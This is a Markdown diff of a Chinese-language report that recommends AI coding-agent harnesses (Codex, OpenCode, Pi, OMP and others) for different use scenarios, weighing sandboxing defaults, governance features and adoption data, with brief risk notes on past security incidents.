-| 企业合规 / 治理 | OpenCode（配置治理）或 Codex（执行治理） | 二者互补 | OpenCode 提供 `.well-known` 远程组织配置与 macOS MDM 共 10 层合并的集中管控面；Codex 提供默认沙箱 + 默认断网 + execpolicy 的执行侧合规基线，分别覆盖"配置从哪里生效"与"命令在哪里执行"两个审计问题 | OpenCode 10 层合并 × 最后匹配获胜几乎无人能心算最终生效集，需配层序可视化治理；Codex 有 CODEX_HOME 配置装载 CVE 史，且 yolo 档可一键拆光全部防护，企业侧应禁用 |
-| 隔离敏感 / 离线 | Codex | Pi + Gondolin/Docker 外置隔离 | Codex 四档 SandboxPolicy（read-only→danger-full-access）以 OS 内核沙箱（Seatbelt/bwrap+seccomp）兜底、workspace-write 默认断网，是九家中唯一的"默认安全"完整答卷 | 避免 grok-build：全仓库上传事件证明其服务端 flag 可远程改变本地行为、源码审计看不见，信任重建前不适合隔离场景；Pi 路线把安全责任整体转移给部署方，合规评估须覆盖部署形态 |
-| 多模型路由 | OMP | Pi | OMP 归一化约 45 个 provider、把九族工具调用方言（anthropic/harmony/qwen3/deepseek/glm-4.5/kimi-k2/gemini/gemma/pi-native）收进逐家族转换层，是"任意模型用同一套工具"的最重工程资产；Pi 的 registerProvider 即时生效 + ModelRuntime 动态目录是最轻接入面 | 多模型聚合正处厂商摩擦前沿：OMP 作者跑榜期间 Gemini 账号被封、Anthropic 已服务端封禁过第三方客户端，OAuth 聚合路线存在合规脆弱性，关键业务须备直连 API 退路 |
+| 场景            | 首选                                     | 备选                          | 理由（一句）                                                                                                                                                                                                                                            | 风险提示（一句）                                                                                                                                                         |
+| --------------- | ---------------------------------------- | ----------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
+| 教学 / 学习     | mini-coding-agent                        | Pi                            | 1,019 行纯标准库单文件、校验→防重→审批的五步闸可单步调试，18 项测试本机通过，已被第三方技能市场当作 canonical 教材（"Raschka 文章→mini 源码→pi-mono"路径）                                                                                              | 字符闸无 tokenizer、安全三件套仅教学量级，作者已明示与生产的界限，勿直接投产                                                                                             |
+| 个人折腾 / 定制 | 极简派选 Pi；电池派选 OMP                | 互为备选                      | Pi 以 792 行核心循环 + 约 30 个扩展事件给足改造面；OMP 把 MCP、task 子代理、审批、plan mode 全内置成 27 公开 + 2 隐藏工具平面，哲学分歧是"减法 vs 加法"且两派各有受众                                                                                   | Pi 零内置安全需自带隔离，上手摩擦有 90 分钟失败实录（Discussion #3735）；OMP 效果宣称需打折，snapcompact 有端点兼容故障前科（#3387 致会话永久 400）                      |
+| 团队默认        | OpenCode                                 | Codex                         | 开放服务架构（HTTP/OpenAPI、SDK 同源生成）+ 多模型自由 + 186.6k stars 的采用度护城河，AGENTS.md 互读使迁移成本趋零，换 harness 不等于推翻团队指令资产                                                                                                   | 权限引擎官方自认 UX 层而非安全边界，有未授权 RCE 前科（HN 432pts）与 Anthropic OAuth 封禁史（2026-01-09），团队部署需在权限层之外另补隔离                                |
+| 企业合规 / 治理 | OpenCode（配置治理）或 Codex（执行治理） | 二者互补                      | OpenCode 提供 `.well-known` 远程组织配置与 macOS MDM 共 10 层合并的集中管控面；Codex 提供默认沙箱 + 默认断网 + execpolicy 的执行侧合规基线，分别覆盖"配置从哪里生效"与"命令在哪里执行"两个审计问题                                                      | OpenCode 10 层合并 × 最后匹配获胜几乎无人能心算最终生效集，需配层序可视化治理；Codex 有 CODEX_HOME 配置装载 CVE 史，且 yolo 档可一键拆光全部防护，企业侧应禁用           |
+| 隔离敏感 / 离线 | Codex                                    | Pi + Gondolin/Docker 外置隔离 | Codex 四档 SandboxPolicy（read-only→danger-full-access）以 OS 内核沙箱（Seatbelt/bwrap+seccomp）兜底、workspace-write 默认断网，是九家中唯一的"默认安全"完整答卷                                                                                        | 避免 grok-build：全仓库上传事件证明其服务端 flag 可远程改变本地行为、源码审计看不见，信任重建前不适合隔离场景；Pi 路线把安全责任整体转移给部署方，合规评估须覆盖部署形态 |
+| 多模型路由      | OMP                                      | Pi                            | OMP 归一化约 45 个 provider、把九族工具调用方言（anthropic/harmony/qwen3/deepseek/glm-4.5/kimi-k2/gemini/gemma/pi-native）收进逐家族转换层，是"任意模型用同一套工具"的最重工程资产；Pi 的 registerProvider 即时生效 + ModelRuntime 动态目录是最轻接入面 | 多模型聚合正处厂商摩擦前沿：OMP 作者跑榜期间 Gemini 账号被封、Anthropic 已服务端封禁过第三方客户端，OAuth 聚合路线存在合规脆弱性，关键业务须备直连 API 退路              |
 
 矩阵的三点解读。第一，grok-build 在六个场景中零首选、一次被点名避免——纸面机制数量与选型价值脱钩：安全机制默认全关（H12）剥夺其在企业/隔离场景的资格，全仓库上传事件（H13）再剥夺其在隐私敏感场景的资格，这是 I8"信任工程"四层（默认配置、遥测行为、供应链、市场治理）在行动层的直接投射；其剩余价值在组件级移植（worktree 隔离、pin 与回读机制）而非整体采用。第二，"首选 + 备选"呈稳定的成对结构：Pi↔OMP 是哲学分歧（社区定性"Pi bets on subtraction, Omp bets on accumulation"，两派各有受众），OpenCode↔Codex 是治理面互补（配置治理 vs 执行治理）；由于 AGENTS.md/SKILL.md 配置互读使迁移成本趋零（I3），这些成对选择不是终身承诺，团队可以低成本试错后在两极间滑动。第三，矩阵刻意回避一切榜单名次：Codex 的 TB2.0 #4 是自提交且未经独立审计的条目，OpenCode #64 是模型已换代的陈旧条目（经核实），在基准污染未被系统性清理之前，任何以名次支撑选型的论证都建在流沙上——改用采用度数据（npm 月下载 @openai/codex 49.3M / opencode-ai 9.0M / pi-ai 8.6M）、默认姿态审计与可溯源事件这三件可核验之物。
 
